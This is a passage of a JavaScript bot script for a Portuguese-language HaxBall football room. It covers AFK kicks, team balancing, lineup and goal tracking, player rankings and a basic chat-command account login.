                    1.5 * 1000,
                    player.id
                );
            } else {
                return true;
            }
            return false
        }
        if (!SMSet.has(player.id)) {
            SMSet.add(player.id);
            setTimeout(
                (number) => {
                    SMSet.delete(number);
                },
                slowMode * 1000,
                player.id
            );
        } else {
            return true;
        }
    }
    return false;
}

/* PLAYER FUNCTIONS */

function updateTeams() {
    playersAll = room.getPlayerList();
    players = playersAll.filter((p) => !AFKSet.has(p.id))
    teamRed = players.filter((p) => p.team == Team.RED);
    teamBlue = players.filter((p) => p.team == Team.BLUE);
    teamSpec = players.filter((p) => p.team == Team.SPECTATORS);
}

function updateAdmins(excludedPlayerID = 0) {
    if (players.length != 0 && players.filter((p) => p.admin).length < maxAdmins) {
        let playerArray = players.filter((p) => p.id != excludedPlayerID && !p.admin);
        let arrayID = playerArray.map((player) => player.id);
        room.setPlayerAdmin(Math.min(...arrayID), true);
    }
}

function getRole(player) {
    return (
        !!masterList.find((a) => a == authArray[player.id]) * 6 +
        !!donoList.find((a) => a == authArray[player.id]) * 5 +
        !!diretores.find((a) => a == authArray[player.id]) * 4 +
        !!gerentes.find((a) => a == authArray[player.id]) * 3 +
        !!adminList.find((a) => a == authArray[player.id]) * 2 +
        !!mods.find((a) => a == authArray[player.id]) * 1
    );
}

function ghostKickHandle(oldP, newP) {
    var teamArrayId = getTeamArray(oldP.team).map((p) => p.id);
    teamArrayId.splice(teamArrayId.findIndex((id) => id == oldP.id), 1, newP.id);

    room.kickPlayer(oldP.id, 'Ghost kick', false);
    room.setPlayerTeam(newP.id, oldP.team);
    room.setPlayerAdmin(newP.id, oldP.admin);
    room.reorderPlayers(teamArrayId, true);

    if (oldP.team != Team.SPECTATORS && playSituation != Situation.STOP) {
        var discProp = room.getPlayerDiscProperties(oldP.id);
        room.setPlayerDiscProperties(newP.id, discProp);
    }
}

/* ACTIVITY FUNCTIONS */

function handleActivityPlayer(player) {
    let pComp = getPlayerComp(player);
    if (pComp != null) {
        pComp.inactivityTicks++;
        if (pComp.inactivityTicks == 60 * (10)) {
            room.sendAnnouncement(
                `⛔ ${player.name}, se você não se mover ou enviar uma mensagem nos próximos ${Math.floor(12)} segundos, você será expulso!`,
                player.id,
                warningColor,
                'bold',
                HaxNotification.MENTION
            );
            return;
        }
        if (pComp.inactivityTicks == 60 * (16)) {
            room.sendAnnouncement(
                `⛔ ${player.name}, se você não se mover ou enviar uma mensagem nos próximos ${Math.floor(6)} segundos, você será expulso!`,
                player.id,
                warningColor,
                'bold',
                HaxNotification.MENTION
            );
            return;
        }
        if (pComp.inactivityTicks >= 60 * 22) {
            pComp.inactivityTicks = 0;
            if (game.scores.time <= afkLimit - 0.5) {
                setTimeout(() => {
                    !chooseMode ? instantRestart() : room.stopGame();
                }, 10);
            }
            room.kickPlayer(player.id, 'AFK', false);
        }
    }
}

function handleActivityPlayerTeamChange(changedPlayer) {
    if (changedPlayer.team == Team.SPECTATORS) {
        let pComp = getPlayerComp(changedPlayer);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
}

function handleActivityStop() {
    for (let player of players) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
}

function handleActivity() {
    if (gameState === State.PLAY && players.length > 1) {
        for (let player of teamRed) {
            handleActivityPlayer(player);
        }
        for (let player of teamBlue) {
            handleActivityPlayer(player);
        }
    }
}

/* LINEUP FUNCTIONS */

function getStartingLineups() {
    var compositions = [[], []];
    for (let player of teamRed) {
        compositions[0].push(
            new PlayerComposition(player, authArray[player.id], [0], [])
        );
    }
    for (let player of teamBlue) {
        compositions[1].push(
            new PlayerComposition(player, authArray[player.id], [0], [])
        );
    }
    return compositions;
}

async function credits(player, message) {
    room.sendAnnouncement(`O no recoil desenvolveu esse script !!`, player.id, cores.turquesa, 'bold', 3);
    room.sendAnnouncement(`- Faça parte do servidor oficial dele: https://discord.gg/NbgpBD3Teq`, player.id, cores.violeta, 'bold', 3);
    return false;
};

function handleLineupChangeTeamChange(changedPlayer) {
    if (gameState != State.STOP) {
        var playerLineup;
        if (changedPlayer.team == Team.RED) {
            // player gets in red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id]);
            if (ind != -1) {
                // Player goes back in
                playerLineup = game.playerComp[0][ind];
                if (playerLineup.timeExit.includes(game.scores.time)) {
                    // gets subbed off then in at the exact same time -> no sub
                    playerLineup.timeExit = playerLineup.timeExit.filter((t) => t != game.scores.time);
                } else {
                    playerLineup.timeEntry.push(game.scores.time);
                }
            } else {
                playerLineup = new PlayerComposition(
                    changedPlayer,
                    authArray[changedPlayer.id],
                    [game.scores.time],
                    []
                );
                game.playerComp[0].push(playerLineup);
            }
        } else if (changedPlayer.team == Team.BLUE) {
            // player gets in blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id]);
            if (ind != -1) {
                // Player goes back in
                playerLineup = game.playerComp[1][ind];
                if (playerLineup.timeExit.includes(game.scores.time)) {
                    // gets subbed off then in at the exact same time -> no sub
                    playerLineup.timeExit = playerLineup.timeExit.filter((t) => t != game.scores.time);
                } else {
                    playerLineup.timeEntry.push(game.scores.time);
                }
            } else {
                playerLineup = new PlayerComposition(
                    changedPlayer,
                    authArray[changedPlayer.id],
                    [game.scores.time],
                    []
                );
                game.playerComp[1].push(playerLineup);
            }
        }
        if (teamRed.some((r) => r.id == changedPlayer.id)) {
            // player leaves red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id]);
            playerLineup = game.playerComp[0][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[0].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        } else if (teamBlue.some((r) => r.id == changedPlayer.id)) {
            // player leaves blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[changedPlayer.id]);
            playerLineup = game.playerComp[1][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[1].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        }
    }
}

function handleLineupChangeLeave(player) {
    if (playSituation != Situation.STOP) {
        if (player.team == Team.RED) {
            // player gets in red team
            var redLineupAuth = game.playerComp[0].map((p) => p.auth);
            var ind = redLineupAuth.findIndex((auth) => auth == authArray[player.id]);
            var playerLineup = game.playerComp[0][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[0].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        } else if (player.team == Team.BLUE) {
            // player gets in blue team
            var blueLineupAuth = game.playerComp[1].map((p) => p.auth);
            var ind = blueLineupAuth.findIndex((auth) => auth == authArray[player.id]);
            var playerLineup = game.playerComp[1][ind];
            if (playerLineup.timeEntry.includes(game.scores.time)) {
                // gets subbed off then in at the exact same time -> no sub
                if (game.scores.time == 0) {
                    game.playerComp[1].splice(ind, 1);
                } else {
                    playerLineup.timeEntry = playerLineup.timeEntry.filter((t) => t != game.scores.time);
                }
            } else {
                playerLineup.timeExit.push(game.scores.time);
            }
        }
    }
}

/* TEAM BALANCE FUNCTIONS */

function balanceTeams() {
    if (!chooseMode) {
        if (players.length == 0) {
            room.stopGame();
            room.setScoreLimit(scoreLimit);
            room.setTimeLimit(timeLimit);
        } else if (players.length == 1 && teamRed.length == 0) {
            room.setPlayerTeam(players[0].id, Team.RED)
            instantRestart()
        } else if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length && teamSpec.length > 0) {
            const n = Math.abs(teamRed.length - teamBlue.length);
            if (players.length == 2) {
                instantRestart();
            }
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(teamSpec[i].id, Team.BLUE);
                }
            } else {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(teamSpec[i].id, Team.RED);
                }
            }
        } else if (Math.abs(teamRed.length - teamBlue.length) > teamSpec.length) {
            const n = Math.abs(teamRed.length - teamBlue.length);
            if (players.length == 1) {
                instantRestart();
                room.setPlayerTeam(players[0].id, Team.RED);
                return;
            } else if (teamSize > 2 && players.length == 5) {
                instantRestart();
            }
            if (players.length == teamSize * 2 - 1) {
                teamRedStats = [];
                teamBlueStats = [];
            }
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(
                        teamRed[teamRed.length - 1 - i].id,
                        Team.SPECTATORS
                    );
                }
            } else {
                for (var i = 0; i < n; i++) {
                    room.setPlayerTeam(
                        teamBlue[teamBlue.length - 1 - i].id,
                        Team.SPECTATORS
                    );
                }
            }
        } else if (Math.abs(teamRed.length - teamBlue.length) < teamSpec.length && teamRed.length != teamBlue.length) {
            room.pauseGame(true);
            activateChooseMode();
            choosePlayer();
        } else if (teamSpec.length >= 2 && teamRed.length == teamBlue.length && teamRed.length < teamSize) {
            if (teamRed.length == 2) {
                instantRestart();
            }
            topButton();
        }
    }
}

function handlePlayersJoin() {
    if (chooseMode) {
        getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
    }
    balanceTeams();
}

function handlePlayersLeave() {
    if (gameState != State.STOP) {
        var scores = room.getScores();
        if (players.length >= 2 * teamSize && scores.time >= (5 / 6) * game.scores.timeLimit && teamRed.length != teamBlue.length) {
            var rageQuitCheck = false;
            if (teamRed.length < teamBlue.length) {
                if (scores.blue - scores.red == 2) {
                    endGame(Team.BLUE);
                    rageQuitCheck = true;
                }
            } else {
                if (scores.red - scores.blue == 2) {
                    endGame(Team.RED);
                    rageQuitCheck = true;
                }
            }
            if (rageQuitCheck) {
                room.sendAnnouncement(
                    "Ragequit detectado, o jogo terminou.",
                    null,
                    infoColor,
                    'bold',
                    HaxNotification.MENTION
                )
                stopTimeout = setTimeout(() => {
                    room.stopGame();
                }, 100);
                return;
            }
        }
    }
    if (chooseMode) {
        if (teamSize > 2 && players.length == 5) {
            /*setTimeout(() => {
                stadiumCommand(emptyPlayer, `!classic`);
            }, 5);*/
        }
        if (teamRed.length == 0 || teamBlue.length == 0) {
            room.setPlayerTeam(teamSpec[0].id, teamRed.length == 0 ? Team.RED : Team.BLUE);
            return;
        }
        if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length) {
            deactivateChooseMode();
            resumeGame();
            var b = teamSpec.length;
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            } else {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.RED);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            }
            return;
        }
        if (streak == 0 && gameState == State.STOP) {
            if (Math.abs(teamRed.length - teamBlue.length) == 2) {
                var teamIn = teamRed.length > teamBlue.length ? teamRed : teamBlue;
                room.setPlayerTeam(teamIn[teamIn.length - 1].id, Team.SPECTATORS)
            }
        }
        if (teamRed.length == teamBlue.length && teamSpec.length < 2) {
            deactivateChooseMode();
            resumeGame();
            return;
        }

        if (capLeft) {
            choosePlayer();
        } else {
            getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
        }
    }
    balanceTeams();
}

function handlePlayersTeamChange(byPlayer) {
    if (chooseMode && !removingPlayers && byPlayer == null) {
        if (Math.abs(teamRed.length - teamBlue.length) == teamSpec.length) {
            deactivateChooseMode();
            resumeGame();
            var b = teamSpec.length;
            if (teamRed.length > teamBlue.length) {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            } else {
                for (var i = 0; i < b; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        room.setPlayerTeam(teamSpec[0].id, Team.RED);
                    }, 5 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 5 * b);
            }
            return;
        } else if (
            (teamRed.length == teamSize && teamBlue.length == teamSize) ||
            (teamRed.length == teamBlue.length && teamSpec.length < 2)
        ) {
            deactivateChooseMode();
            resumeGame();
        } else if (teamRed.length <= teamBlue.length && redCaptainChoice != '') {
            if (redCaptainChoice == 'top') {
                room.setPlayerTeam(teamSpec[0].id, Team.RED);
            } else if (redCaptainChoice == 'random') {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.RED);
            } else {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.RED);
            }
            return;
        } else if (teamBlue.length < teamRed.length && blueCaptainChoice != '') {
            if (blueCaptainChoice == 'top') {
                room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
            } else if (blueCaptainChoice == 'random') {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.BLUE);
            } else {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.BLUE);
            }
            return;
        } else {
            choosePlayer();
        }
    }
}

function handlePlayersStop(byPlayer) {
    if (byPlayer == null && endGameVariable) {
        if (chooseMode) {
            if (players.length == 2 * teamSize) {
                chooseMode = false;
                resetButton();
                for (var i = 0; i < teamSize; i++) {
                    clearTimeout(insertingTimeout);
                    insertingPlayers = true;
                    setTimeout(() => {
                        randomButton();
                    }, 200 * i);
                }
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 200 * teamSize);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else if (lastWinner == Team.BLUE) {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 10);
                } else {
                    resetButton();
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    topButton();
                }, 300);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 300);
            }
        } else {
            if (players.length == 1) {
                instantRestart()
            }
            if (players.length == 2) {
                if (lastWinner == Team.BLUE) {
                    swapButton();
                }
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 3 || players.length >= 2 * teamSize + 1) {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 5);
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    topButton();
                }, 200);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 300);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 4) {
                resetButton();
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                setTimeout(() => {
                    randomButton();
                    setTimeout(() => {
                        randomButton();
                    }, 500);
                }, 500);
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 2000);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            } else if (players.length == 5 || players.length >= 2 * teamSize + 1) {
                if (lastWinner == Team.RED) {
                    blueToSpecButton();
                } else {
                    redToSpecButton();
                    setTimeout(() => {
                        swapButton();
                    }, 5);
                }
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 200);
                setTimeout(() => {
                    topButton();
                }, 200);
                activateChooseMode();
            } else if (players.length == 6) {
                resetButton();
                clearTimeout(insertingTimeout);
                insertingPlayers = true;
                insertingTimeout = setTimeout(() => {
                    insertingPlayers = false;
                }, 1500);
                setTimeout(() => {
                    randomButton();
                    setTimeout(() => {
                        randomButton();
                        setTimeout(() => {
                            randomButton();
                        }, 500);
                    }, 500);
                }, 500);
                startTimeout = setTimeout(() => {
                    room.startGame();
                }, 2000);
            }
        }
    }
}

/* STATS FUNCTIONS */

async function encryptPassword(password) {
    const encoder = new TextEncoder();
    const data = encoder.encode(password);

    const hashBuffer = await crypto.subtle.digest('SHA-256', data);

    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');

    return hashHex;
}

async function registrar(player, message) {
    var msgArray = message.split(/ +/);
    var conn = playerConnections.get(player.id);
    var auth = playerAuth.get(player.id);
    var ipv4 = playerIpv4.get(player.id);
    var pass = msgArray[1];

    if (account[player.name]) return room.sendAnnouncement("Você já está registrado.", player.id);

    var password = await encryptPassword(pass).then(senhaCriptografada => {
        return senhaCriptografada;
    });

    if (!Array.isArray(contas)) {
        contas = [];
    }

    if (account2[player.name]) {
        delete account2[player.name];

        const playerIndex = subAccounts.findIndex(item => item[player.name]);
        if (playerIndex !== -1) {
            subAccounts.splice(playerIndex, 1);
        }
    }

    account[player.name] = {
        id: player.id,
        nome: player.name,
        senha: password,
        auth: auth,
        conn: conn,
        ipv4: ipv4,
        entrada: new Date().toString()
    };

    contas.splice(0, contas.length);
    contas.push(account);

    localStorage.setItem("contas", JSON.stringify(contas));
    room.sendAnnouncement(`Sua senha é: ${msgArray[1]}. Para a sua segurança a sua senha foi encriptada, somente você tem acesso a ela!`, player.id, 0xFFFFFF, "bold", 2);

    return false;
}

async function login(player, message) {
    var msgArray = message.split(/ +/);
    var pass = msgArray[1];

    var password = await encryptPassword(pass).then(senhaCriptografada => {
        return senhaCriptografada;
    });

    if (confirm.includes(player.id)) {
        room.sendAnnouncement("Você já confirmou", player.id, 0xFA5646, "bold");
    } else if (!account[player.name]) {
        room.sendAnnouncement("Você não está registrado", player.id, 0xFA5646, "bold")
    } else if (account[player.name].senha !== password) {
        room.sendAnnouncement("Senha incorreta", player.id, 0xFA5646, "bold")
    } else if (!confirm.includes(player.id)) {
        room.sendAnnouncement(`${player.name} fez seu login!`, null, 0xFA5646, "bold");
        confirm.push(player.id);
    }
}

function mudarSenha(player, password) {
    var msgArray = password.split(/ +/)
    if (confirm.includes(player.id)) {
        account[player.name] = msgArray[1]
        room.sendAnnouncement(`Senha alterada com sucesso! Nova Senha: ${msgArray[1]}`, player.id);
    }
}

/* GK FUNCTIONS */

function handleGKTeam(team) {
    if (team == Team.SPECTATORS) {
        return null;
    }
    let teamArray = team == Team.RED ? teamRed : teamBlue;
    let playerGK = teamArray.reduce((prev, current) => {
        if (team == Team.RED) {
            return (prev?.position.x < current.position.x) ? prev : current
        } else {
            return (prev?.position.x > current.position.x) ? prev : current
        }
    }, null);
    let playerCompGK = getPlayerComp(playerGK);
    return playerCompGK;
}

function handleGK() {
    let redGK = handleGKTeam(Team.RED);
    if (redGK != null) {
        redGK.GKTicks++;
    }
    let blueGK = handleGKTeam(Team.BLUE);
    if (blueGK != null) {
        blueGK.GKTicks++;
    }
}

function getGK(team) {
    if (team == Team.SPECTATORS) {
        return null;
    }
    let teamArray = team == Team.RED ? game.playerComp[0] : game.playerComp[1];
    let playerGK = teamArray.reduce((prev, current) => {
        return (prev?.GKTicks > current.GKTicks) ? prev : current
    }, null);
    return playerGK;
}

function getCS(scores) {
    let playersNameCS = [];
    let redGK = getGK(Team.RED);
    let blueGK = getGK(Team.BLUE);
    if (redGK != null && scores.blue == 0) {
        playersNameCS.push(redGK.player.name);
    }
    if (blueGK != null && scores.red == 0) {
        playersNameCS.push(blueGK.player.name);
    }
    return playersNameCS;
}

function getCSString(scores) {
    let playersCS = getCS(scores);
    if (playersCS.length == 0) {
        return "🥅 +0 cs";
    } else if (playersCS.length == 1) {
        return `🥅 ${playersCS[0]} +1 cs.`;
    } else {
        return `🥅 ${playersCS[0]} e ${playersCS[1]} +1 CS.`;
    }
}

/* GLOBAL STATS FUNCTIONS */

function getLastTouchOfTheBall() {
    const ballPosition = room.getBallPosition();
    updateTeams();
    let playerArray = [];
    for (let player of players) {
        if (player.position != null) {
            var distanceToBall = pointDistance(player.position, ballPosition);
            if (distanceToBall < triggerDistance) {
                if (playSituation == Situation.KICKOFF) playSituation = Situation.PLAY;
                playerArray.push([player, distanceToBall]);
            }
        }
    }
    if (playerArray.length != 0) {
        let playerTouch = playerArray.sort((a, b) => a[1] - b[1])[0][0];
        if (lastTeamTouched == playerTouch.team || lastTeamTouched == Team.SPECTATORS) {
            if (lastTouches[0] == null || (lastTouches[0] != null && lastTouches[0].player.id != playerTouch.id)) {
                game.touchArray.push(
                    new BallTouch(
                        playerTouch,
                        game.scores.time,
                        getGoalGame(),
                        ballPosition
                    )
                );
                lastTouches[0] = checkGoalKickTouch(
                    game.touchArray,
                    game.touchArray.length - 1,
                    getGoalGame()
                );
                lastTouches[1] = checkGoalKickTouch(
                    game.touchArray,
                    game.touchArray.length - 2,
                    getGoalGame()
                );
            }
        }
        lastTeamTouched = playerTouch.team;
    }
}

function getBallSpeed() {
    var ballProp = room.getDiscProperties(0);
    return Math.sqrt(ballProp.xspeed ** 2 + ballProp.yspeed ** 2) * speedCoefficient;
}

function getGameStats() {
    if (playSituation == Situation.PLAY && gameState == State.PLAY) {
        lastTeamTouched == Team.RED ? possession[0]++ : possession[1]++;
        var ballPosition = room.getBallPosition();
        ballPosition.x < 0 ? actionZoneHalf[0]++ : actionZoneHalf[1]++;
        handleGK();
    }
}

/* GOAL ATTRIBUTION FUNCTIONS */

function getGoalAttribution(team) {
    var goalAttribution = Array(2).fill(null);
    if (lastTouches[0] != null) {
        if (lastTouches[0].player.team == team) {
            // Direct goal scored by player
            if (lastTouches[1] != null && lastTouches[1].player.team == team) {
                goalAttribution = [lastTouches[0].player, lastTouches[1].player];
            } else {
                goalAttribution = [lastTouches[0].player, null];
            }
        } else {
            // Own goal
            goalAttribution = [lastTouches[0].player, null];
        }
    }
    return goalAttribution;
}

function getGoalString(team) {
    var goalString;
    var scores = game.scores;
    goalAttribution = getGoalAttribution(team);
    if (goalAttribution[0] != null) {
        if (goalAttribution[0].team == team) {
            if (goalAttribution[1] != null && goalAttribution[1].team == team) {
                goalString = `⚽ ${getTimeGame(scores.time)} Gol de ${goalAttribution[0].name} ! Assistencia de ${goalAttribution[1].name}. Velocidade da bola: ${ballSpeed.toFixed(2)}km/h.`;
                game.goals.push(
                    new Goal(
                        scores.time,
                        team,
                        goalAttribution[0],
                        goalAttribution[1]
                    )
                );
            } else {
                goalString = `⚽ ${getTimeGame(scores.time)} Gol de ${goalAttribution[0].name} ! Velocidade da bola: ${ballSpeed.toFixed(2)}km/h.`;
                game.goals.push(
                    new Goal(scores.time, team, goalAttribution[0], null)
                );
            }
        } else {
            goalString = `😂 ${getTimeGame(scores.time)} Gol contra por ${goalAttribution[0].name} ! Velocidade da bola: ${ballSpeed.toFixed(2)}km/h.`;
            game.goals.push(
                new Goal(scores.time, team, goalAttribution[0], null)
            );
        }
    } else {
        goalString = `⚽ ${getTimeGame(scores.time)} Gol para o time ${team == Team.RED ? 'Vermelho' : 'Azul'} team ! Velocidade da bola: ${ballSpeed.toFixed(2)}km/h.`;
        game.goals.push(
            new Goal(scores.time, team, null, null)
        );
    }

    return goalString;
}

/* ROOM STATS FUNCTIONS */

function updatePlayerStats(player, teamStats) {
    var stats = new HaxStatistics(player.name);
    var pComp = getPlayerComp(player);
    if (localStorage.getItem(authArray[player.id])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id]));
    }

    var pointsForWin = 6; // +6 Pontos 
    var pointsForGoal = 1; // +1 Ponto 
    var pointsForAssist = 1; // +1 Ponto
    var pointsForCS = 1; // +1 Ponto
    var pointsForDraw = 1; // +1 Ponto
    var pointsForLoss = -1; // -1 Ponto

    stats.games++;

    var conta = Math.round(
        (pointsForWin * stats.wins) +
        (pointsForGoal * stats.goals) +
        (pointsForAssist * stats.assists) +
        (pointsForCS * stats.CS) +
        (pointsForDraw * stats.empates) +
        (pointsForLoss * (stats.games - stats.wins))
    );
    addAstros(player, conta);

    if (lastWinner == teamStats) {
        stats.wins += 1;
    }

    if (lastWinner == 0) {
        stats.empates += 1;
    }

    stats.winrate = ((100 * stats.wins) / (stats.games || 1)).toFixed(1) + `%`;

    var goalsScored = getGoalsPlayer(pComp);
    stats.goals += goalsScored;

    stats.assists += getAssistsPlayer(pComp);
    stats.ownGoals += getOwnGoalsPlayer(pComp);
    stats.CS += getCSPlayer(pComp);
    stats.pontos = Math.round(
        (pointsForWin * stats.wins) +
        (pointsForGoal * stats.goals) +
        (pointsForAssist * stats.assists) +
        (pointsForCS * stats.CS) +
        (pointsForDraw * stats.empates) +
        (pointsForLoss * (stats.games - stats.wins))
    );

    localStorage.setItem(authArray[player.id], JSON.stringify(stats));
}

function updateStats() {
    if (
        players.length >= 2 * teamSize &&
        (
            game.scores.time >= (5 / 6) * game.scores.timeLimit ||
            game.scores.red == game.scores.scoreLimit ||
            game.scores.blue == game.scores.scoreLimit
        ) &&
        teamRedStats.length >= teamSize && teamBlueStats.length >= teamSize
    ) {
        for (let player of teamRedStats) {
            updatePlayerStats(player, Team.RED);
        }
        for (let player of teamBlueStats) {
            updatePlayerStats(player, Team.BLUE);
        }
    }
}

function printRankings(statKey, id = 0) {
    var leaderboard = [];
    statKey = statKey == "cs" ? "CS" : statKey;
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (key.length == 43)
            leaderboard.push([
                JSON.parse(localStorage.getItem(key)).playerName,
                JSON.parse(localStorage.getItem(key))[statKey],
            ]);
    }
    if (leaderboard.length < 5) {
        if (id != 0) {
            room.sendAnnouncement(
                'Ainda não há jogos suficientes!',
                id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
        return;
    }
    leaderboard.sort(function (a, b) { return b[1] - a[1]; });
    statKey = statNameTranslation[statKey] ? statNameTranslation[statKey] : statKey
    var rankingString = `${statKey.charAt(0).toUpperCase() + statKey.slice(1)}> `;
    for (let i = 0; i < 5; i++) {
        let playerName = leaderboard[i][0];
        let playerStat = leaderboard[i][1];
        rankingString += `#${i + 1} ${playerName} : ${playerStat}, `;
    }
    rankingString = rankingString.substring(0, rankingString.length - 2);
    room.sendAnnouncement(
        rankingString,
        id,
        infoColor,
        'bold',
        HaxNotification.CHAT
    );
}

/* GET STATS FUNCTIONS */

function getGamePlayerStats(player) {
    var stats = new HaxStatistics(player.name);
    var pComp = getPlayerComp(player);
    stats.goals += getGoalsPlayer(pComp);
    stats.assists += getAssistsPlayer(pComp);
    stats.ownGoals += getOwnGoalsPlayer(pComp);
    stats.CS += getCSPlayer(pComp);
    return stats;
}

function getGametimePlayer(pComp) {
    if (pComp == null) return 0;//
    var timePlayer = 0;
    for (let j = 0; j < pComp.timeEntry.length; j++) {
        if (pComp.timeExit.length < j + 1) {
            timePlayer += game.scores.time - pComp.timeEntry[j];
        } else {
            timePlayer += pComp.timeExit[j] - pComp.timeEntry[j];
        }
    }
    return Math.floor(timePlayer);
}

function getGoalsPlayer(pComp) {
    if (pComp == null) return 0;
    var goalPlayer = 0;
    for (let goal of game.goals) {
        if (goal.striker != null && goal.team === pComp.player.team) {
            if (authArray[goal.striker.id] == pComp.auth) {
                goalPlayer++;
                addAstros(goal.striker, 5)
            }
        }
    }
    return goalPlayer;
}

function getOwnGoalsPlayer(pComp) {
    if (pComp == null) return 0;//
    var goalPlayer = 0;
    for (let goal of game.goals) {
        if (goal.striker != null && goal.team !== pComp.player.team) {
            if (authArray[goal.striker.id] == pComp.auth) {
                goalPlayer++;
            }
        }
    }
    return goalPlayer;
}

function getAssistsPlayer(pComp) {
    if (pComp == null) return 0;//
    var assistPlayer = 0;
    for (let goal of game.goals) {
        if (goal.assist != null) {
            if (authArray[goal.assist.id] == pComp.auth) {
                assistPlayer++;
                addAstros(goal.assist, 3);
            }
        }
    }
    return assistPlayer;
}

function getGKPlayer(pComp) {
    if (pComp == null) return 0;//
    let GKRed = getGK(Team.RED);
    if (pComp.auth == GKRed?.auth) {
        return Team.RED;
    }
    let GKBlue = getGK(Team.BLUE);
    if (pComp.auth == GKBlue?.auth) {
        return Team.BLUE;
    }
    return Team.SPECTATORS;
}

function getCSPlayer(pComp) {
    if (pComp == null) return 0;//
    if (getGKPlayer(pComp) == Team.RED && game.scores.blue == 0) {
        addAstros(pComp.player, 5)
        return 1;
    } else if (getGKPlayer(pComp) == Team.BLUE && game.scores.red == 0) {
        addAstros(pComp.player, 5);
        return 1;
    }
    return 0;
}

function actionReportCountTeam(goals, team) {
    let playerActionSummaryTeam = [];
    let indexTeam = team == Team.RED ? 0 : 1;
    let indexOtherTeam = team == Team.RED ? 1 : 0;
    for (let goal of goals[indexTeam]) {
        if (goal[0] != null) {
            if (playerActionSummaryTeam.find(a => a[0].id == goal[0].id)) {
                let index = playerActionSummaryTeam.findIndex(a => a[0].id == goal[0].id);
                playerActionSummaryTeam[index][1]++;
            } else {
